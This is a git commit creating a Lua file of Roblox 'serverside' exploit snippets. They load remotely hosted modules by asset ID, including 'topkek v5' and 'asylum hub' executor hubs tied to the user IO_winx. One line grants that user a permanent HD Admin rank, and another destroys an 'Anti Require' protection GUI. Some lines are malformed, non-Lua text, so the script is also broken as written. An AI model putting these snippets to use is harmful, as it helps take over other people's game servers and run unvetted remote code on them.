ffafaa6c57cce6ecd804cb056ca8256ee2ab180f
IO_winx <88767298+ModScripts@users.noreply.github.com>
2022-06-29 14:24:29 +1000

    Create scripts.lua

---
+++ scripts.lua
@@ -0,0 +1,10 @@
+--Backrooms
+require(9402960863):LoadMap(true,true,true)
+require(5629370050):Backrooms()
+--Other scripts
+require(5610305900)("IO_winx") - topkek v5 working (NOT SCAM)
+require(5074965957):Asylumgotskidded("IO_winx") - asylum hub
+HD Admin
+require(game:GetService("ReplicatedStorage"):WaitForChild("HDAdminSetup")):GetMain():GetModule("API"):SetRank(game.Players.IO_winx, 4, "Perm")
+Anti Require
+game.Players.IO_winx.PlayerGui.Epic:Destroy()
